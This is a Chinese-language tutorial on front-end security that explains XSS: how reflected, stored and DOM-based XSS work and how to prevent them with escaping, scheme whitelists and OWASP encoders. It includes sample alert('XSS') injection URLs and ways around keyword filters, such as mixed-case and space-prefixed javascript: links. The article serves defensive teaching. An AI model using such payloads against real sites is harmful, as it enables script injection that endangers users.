I"<h1 id="前端安全系列一如何防止xss攻击"><a href="https://tech.meituan.com/2018/09/27/fe-security.html">前端安全系列（一）如何防止XSS攻击？</a></h1>

<h2 id="前端安全">前端安全</h2>

<p>随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。</p>

<p>近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端人员在日常开发中不断预防和修复安全漏洞。本文是该系列的第一篇。</p>

<p><strong>本文我们会讲解 XSS ，主要包括：</strong></p>

<ol>
  <li>XSS 攻击的介绍</li>
  <li>XSS 攻击的分类</li>
  <li>XSS 攻击的预防和检测</li>
  <li>XSS 攻击的总结</li>
  <li>XSS 攻击案例</li>
</ol>

<h2 id="xss-攻击的介绍">XSS 攻击的介绍</h2>

<p>在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确：</p>

<ol>
  <li>XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li>
  <li>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</li>
</ol>

<p>如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。</p>

<h3 id="xss-漏洞的发生和修复">XSS 漏洞的发生和修复</h3>

<p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p>

<h4 id="一个案例">一个案例</h4>

<p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"&lt;%= getParameter("</span><span class="na">keyword</span><span class="err">")</span> <span class="err">%</span><span class="nt">&gt;</span>"&gt;
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是：<span class="nt">&lt;</span><span class="err">%=</span> <span class="na">getParameter</span><span class="err">("</span><span class="na">keyword</span><span class="err">")</span> <span class="err">%</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://xxx/search?keyword="&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
</code></pre></div></div>

<p>小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。</p>

<blockquote>
  <p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：</p>
</blockquote>

<p>当浏览器请求 <code class="language-plaintext highlighter-rouge">http://xxx/search?keyword="&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code> 时，服务端会解析出请求参数 <code class="language-plaintext highlighter-rouge">keyword</code>，得到 <code class="language-plaintext highlighter-rouge">"&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>"&gt;
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是："&gt;<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p>浏览器无法分辨出 <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert('XSS');&lt;/script&gt;</code> 是恶意代码，因而将其执行。</p>

<p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p>

<p>面对这种情况，我们应该如何进行防范呢？</p>

<p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p>

<p>聪明的小明很快找到解决方法，把这个漏洞修复：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="na">keyword</span><span class="err">"))</span> <span class="err">%</span><span class="nt">&gt;</span>"&gt;
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是：<span class="nt">&lt;</span><span class="err">%=</span> <span class="na">escapeHTML</span><span class="err">(</span><span class="na">getParameter</span><span class="err">("</span><span class="na">keyword</span><span class="err">"))</span> <span class="err">%</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">escapeHTML()</code> 按照如下规则进行转义：</p>

<table>
  <tbody>
    <tr>
      <td>字符</td>
      <td>转义后的字符</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
    </tr>
  </tbody>
</table>

<p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;"</span><span class="nt">&gt;</span>
<span class="nt">&lt;button&gt;</span>搜索<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;div&gt;</span>
  您搜索的关键词是：<span class="ni">&amp;quot;&amp;gt;&amp;lt;</span>script<span class="ni">&amp;gt;</span>alert(<span class="ni">&amp;#x27;</span>XSS<span class="ni">&amp;#x27;</span>);<span class="ni">&amp;lt;&amp;#x2F;</span>script<span class="ni">&amp;gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p>

<p><strong>通过这个事件，小明学习到了如下知识：</strong></p>

<ul>
  <li>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。</li>
  <li>攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</li>
  <li>攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。</li>
  <li>通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。</li>
</ul>

<h4 id="注意特殊的-html-属性javascript-api">注意特殊的 HTML 属性、JavaScript API</h4>

<p>自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p>

<p>但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。</p>

<p>不久，小明又收到安全组的神秘链接：<code class="language-plaintext highlighter-rouge">http://xxx/?redirect_to=javascript:alert('XSS')</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p>

<p>小明打开对应页面的源码，发现有以下内容：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="na">redirect_to</span><span class="err">"))</span> <span class="err">%</span><span class="nt">&gt;</span>"&gt;跳转...<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>这段代码，当攻击 URL 为 <code class="language-plaintext highlighter-rouge">http://xxx/?redirect_to=javascript:alert('XSS')</code>，服务端响应就成了：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:alert(&amp;#x27;XSS&amp;#x27;)"</span><span class="nt">&gt;</span>跳转...<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>虽然代码不会立即执行，但一旦用户点击 <code class="language-plaintext highlighter-rouge">a</code> 标签时，浏览器会就会弹出“XSS”。</p>

<blockquote>
  <p>可恶，又失策了…</p>
</blockquote>

<p>在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p>

<p>原来不仅仅是特殊字符，连 <code class="language-plaintext highlighter-rouge">javascript:</code> 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p>

<p>小明眉头一皱，想到了解决办法：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 禁止 URL 以 "javascript:" 开头</span>
<span class="n">xss</span> <span class="o">=</span> <span class="n">getParameter</span><span class="o">(</span><span class="s">"redirect_to"</span><span class="o">).</span><span class="na">startsWith</span><span class="o">(</span><span class="err">'</span><span class="nl">javascript:</span><span class="err">'</span><span class="o">);</span>
<span class="k">if</span> <span class="o">(!</span><span class="n">xss</span><span class="o">)</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="n">redirect_to</span><span class="s">"))%&gt;"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"/404"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>只要 URL 的开头不是 <code class="language-plaintext highlighter-rouge">javascript:</code>，就安全了吧？</p>

<p>安全组随手又扔了一个连接：<code class="language-plaintext highlighter-rouge">http://xxx/?redirect_to=jAvascRipt:alert('XSS')</code></p>

<blockquote>
  <p>这也能执行？…..好吧，浏览器就是这么强大。</p>
</blockquote>

<p>小明欲哭无泪，在判断 URL 开头是否为 <code class="language-plaintext highlighter-rouge">javascript:</code> 时，先把用户输入转成了小写，然后再进行比对。</p>

<p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://xxx/?redirect_to=%20javascript:alert('XSS')
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">%20javascript:alert('XSS')</code> 经过 URL 解析后变成 <code class="language-plaintext highlighter-rouge">javascript:alert('XSS')</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p>

<p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等</span>
<span class="n">allowSchemes</span> <span class="o">=</span> <span class="o">[</span><span class="s">"http"</span><span class="o">,</span> <span class="s">"https"</span><span class="o">];</span>

<span class="n">valid</span> <span class="o">=</span> <span class="n">isValid</span><span class="o">(</span><span class="n">getParameter</span><span class="o">(</span><span class="s">"redirect_to"</span><span class="o">),</span> <span class="n">allowSchemes</span><span class="o">);</span>

<span class="k">if</span> <span class="o">(</span><span class="n">valid</span><span class="o">)</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"&lt;%= escapeHTML(getParameter("</span><span class="n">redirect_to</span><span class="s">"))%&gt;"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
  <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">"/404"</span><span class="o">&gt;</span>
    <span class="n">跳转</span><span class="o">...</span>
  <span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>通过这个事件，小明学习到了如下知识：</p>

<ul>
  <li>做了 HTML 转义，并不等于高枕无忧。</li>
  <li>对于链接跳转，如 <code class="language-plaintext highlighter-rouge">&lt;a href="xxx"</code> 或 <code class="language-plaintext highlighter-rouge">location.href="xxx"</code>，要检验其内容，禁止以 <code class="language-plaintext highlighter-rouge">javascript:</code> 开头的链接，和其他非法的 scheme。</li>
</ul>

<h4 id="根据上下文采用不同的转义规则">根据上下文采用不同的转义规则</h4>

<p>某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">initData</span> <span class="o">=</span> <span class="o">&lt;%=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toJSON</span><span class="p">()</span> <span class="o">%&gt;</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>插入 JSON 的地方不能使用 <code class="language-plaintext highlighter-rouge">escapeHTML()</code>，因为转义 <code class="language-plaintext highlighter-rouge">"</code> 后，JSON 格式会被破坏。</p>

<p>但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的：</p>

<ul>
  <li>当 JSON 中包含 <code class="language-plaintext highlighter-rouge">U+2028</code> 或 <code class="language-plaintext highlighter-rouge">U+2029</code> 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。</li>
  <li>当 JSON 中包含字符串 <code class="language-plaintext highlighter-rouge">&lt;/script&gt;</code> 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> 标签等方法就可以完成注入。</li>
</ul>

<p>于是我们又要实现一个 <code class="language-plaintext highlighter-rouge">escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p>

<p><strong>转义规则如下：</strong></p>

<table>
  <tbody>
    <tr>
      <td>字符</td>
      <td>转义后的字符</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">U+2028</code></td>
      <td><code class="language-plaintext highlighter-rouge">\u2028</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">U+2029</code></td>
      <td><code class="language-plaintext highlighter-rouge">\u2029</code></td>
      <td> </td>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">\u003c</code></td>
    </tr>
  </tbody>
</table>

<p><strong>修复后的代码如下：</strong></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">initData</span> <span class="o">=</span> <span class="o">&lt;%=</span> <span class="nx">escapeEmbedJSON</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">toJSON</span><span class="p">())</span> <span class="o">%&gt;</span>
</code></pre></div></div>

<p><strong>通过这个事件，小明学习到了如下知识：</strong></p>

<ul>
  <li>HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。</li>
  <li>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。</li>
</ul>

<h3 id="漏洞总结">漏洞总结</h3>

<p>小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法：</p>

<ul>
  <li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
  <li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
  <li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
  <li>在标签的 href、src 等属性中，包含 <code class="language-plaintext highlighter-rouge">javascript:</code> 等可执行代码。</li>
  <li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
  <li>在 style 属性和标签中，包含类似 <code class="language-plaintext highlighter-rouge">background-image:url("javascript:...");</code> 的代码（新版本浏览器已经可以防范）。</li>
  <li>在 style 属性和标签中，包含类似 <code class="language-plaintext highlighter-rouge">expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
</ul>

<p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p>

<h2 id="xss-攻击的分类">XSS 攻击的分类</h2>

<p>通过上述几个例子，我们已经对 XSS 有了一些认识。</p>

<h3 id="什么是-xss">什么是 XSS</h3>

<p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p>

<p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。</p>

<p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>

<p>而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p>

<p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p>

<p>这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？</p>

<p>不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信：</p>

<ul>
  <li>来自用户的 UGC 信息</li>
  <li>来自第三方的链接</li>
  <li>URL 参数</li>
  <li>POST 参数</li>
  <li>Referer （可能来自不可信的来源）</li>
  <li>Cookie （可能来自其他子域注入）</li>
</ul>

<h3 id="xss-分类">XSS 分类</h3>

<p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>

<table>
  <tbody>
    <tr>
      <td>类型</td>
      <td>存储区*</td>
      <td>插入点*</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td>存储型 XSS</td>
      <td>后端数据库</td>
      <td>HTML</td>
      <td> </td>
      <td>反射型 XSS</td>
      <td>URL</td>
      <td>HTML</td>
      <td> </td>
      <td>DOM 型 XSS</td>
      <td>后端数据库/前端存储/URL</td>
      <td>前端 JavaScript</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>存储区：恶意代码存放的位置。</li>
  <li>插入点：由谁取得恶意代码，并插入到网页上。</li>
</ul>

<h4 id="存储型-xss">存储型 XSS</h4>

<p>存储型 XSS 的攻击步骤：</p>

<ol>
  <li>攻击者将恶意代码提交到目标网站的数据库中。</li>
  <li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
  <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
  <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>

<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>

<h4 id="反射型-xss">反射型 XSS</h4>

<p>反射型 XSS 的攻击步骤：</p>

<ol>
  <li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
  <li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li>
  <li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
  <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>

<p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>

<p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p>

<p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>

<p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p>

<h4 id="dom-型-xss">DOM 型 XSS</h4>

<p>DOM 型 XSS 的攻击步骤：</p>

<ol>
  <li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
  <li>用户打开带有恶意代码的 URL。</li>
  <li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
  <li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>

<p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>

<h2 id="xss-攻击的预防">XSS 攻击的预防</h2>

<p>通过前面的介绍可以得知，XSS 攻击有两大要素：</p>

<ol>
  <li>攻击者提交恶意代码。</li>
  <li>浏览器执行恶意代码。</li>
</ol>

<p>针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？</p>

<h3 id="输入过滤">输入过滤</h3>

<p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p>

<p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p>

<p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？</p>

<p>我们举一个例子，一个正常的用户输入了 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code>。</p>

<p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p>

<p>这里的“并不确定内容要输出到哪里”有两层含义：</p>

<ol>
  <li>
    <p>用户的输入内容可能同时提供给前端和客户端，而一旦经过了 <code class="language-plaintext highlighter-rouge">escapeHTML()</code>，客户端显示的内容就变成了乱码( <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> )。</p>
  </li>
  <li>
    <p>在前端中，不同的位置所需的编码也不同。</p>

    <ul>
      <li>当 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</li>
    </ul>

    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">title=</span><span class="s">"comment"</span><span class="nt">&gt;</span>5 <span class="ni">&amp;lt;</span> 7<span class="nt">&lt;/div&gt;</span>
</code></pre></div>    </div>

    <ul>
      <li>当 <code class="language-plaintext highlighter-rouge">5 &lt; 7</code> 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。</li>
    </ul>
  </li>
</ol>

<p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p>

<p>当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p>

<p>既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：</p>

<ul>
  <li>防止 HTML 中出现注入。</li>
  <li>防止 JavaScript 执行时，执行恶意代码。</li>
</ul>

<h3 id="预防存储型和反射型-xss-攻击">预防存储型和反射型 XSS 攻击</h3>

<p>存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p>

<p>预防这两种漏洞，有两种常见做法：</p>

<ul>
  <li>改成纯前端渲染，把代码和数据分隔开。</li>
  <li>对 HTML 做充分转义。</li>
</ul>

<h4 id="纯前端渲染">纯前端渲染</h4>

<p>纯前端渲染的过程：</p>

<ol>
  <li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li>
  <li>然后浏览器执行 HTML 中的 JavaScript。</li>
  <li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</li>
</ol>

<p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code class="language-plaintext highlighter-rouge">.innerText</code>），还是属性（<code class="language-plaintext highlighter-rouge">.setAttribute</code>），还是样式（<code class="language-plaintext highlighter-rouge">.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p>

<p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 <code class="language-plaintext highlighter-rouge">onload</code> 事件和 <code class="language-plaintext highlighter-rouge">href</code> 中的 <code class="language-plaintext highlighter-rouge">javascript:xxx</code> 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。</p>

<p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p>

<h4 id="转义-html">转义 HTML</h4>

<p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。</p>

<p>常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 <code class="language-plaintext highlighter-rouge">&amp; &lt; &gt; " ' /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p>

<table>
  <tbody>
    <tr>
      <td>XSS 安全漏洞</td>
      <td>简单转义是否有防护作用</td>
      <td> </td>
      <td>-</td>
      <td>-</td>
      <td> </td>
      <td>HTML 标签文字内容</td>
      <td>有</td>
      <td> </td>
      <td>HTML 属性值</td>
      <td>有</td>
      <td> </td>
      <td>CSS 内联样式</td>
      <td>无</td>
      <td> </td>
      <td>内联 JavaScript</td>
      <td>无</td>
      <td> </td>
      <td>内联 JSON</td>
      <td>无</td>
      <td> </td>
      <td>跳转链接</td>
      <td>无</td>
    </tr>
  </tbody>
</table>

<p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p>

<p>例如 Java 工程里，常用的转义库为 <code class="language-plaintext highlighter-rouge">org.owasp.encoder</code>。以下代码引用自 <a href="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project">org.owasp.encoder 的官方说明</a>。</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- HTML 标签内文字内容 --&gt;</span>
<span class="nt">&lt;div&gt;&lt;</span><span class="err">%=</span> <span class="na">Encode</span><span class="err">.</span><span class="na">forHtml</span><span class="err">(</span><span class="na">UNTRUSTED</span><span class="err">)</span> <span class="err">%</span><span class="nt">&gt;&lt;/div&gt;</span>

<span class="c">&lt;!-- HTML 标签属性值 --&gt;</span>
<span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"&lt;%= Encode.forHtml(UNTRUSTED) %&gt;"</span> <span class="nt">/&gt;</span>

<span class="c">&lt;!-- CSS 属性值 --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;"</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- CSS URL --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;"</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- JavaScript 内联代码块 --&gt;</span>
<span class="nt">&lt;script&gt;</span>
  <span class="kd">var</span> <span class="nx">msg</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;</span><span class="dl">"</span><span class="p">;</span>
  <span class="nx">alert</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>

<span class="c">&lt;!-- JavaScript 内联代码块内嵌 JSON --&gt;</span>
<span class="nt">&lt;script&gt;</span>
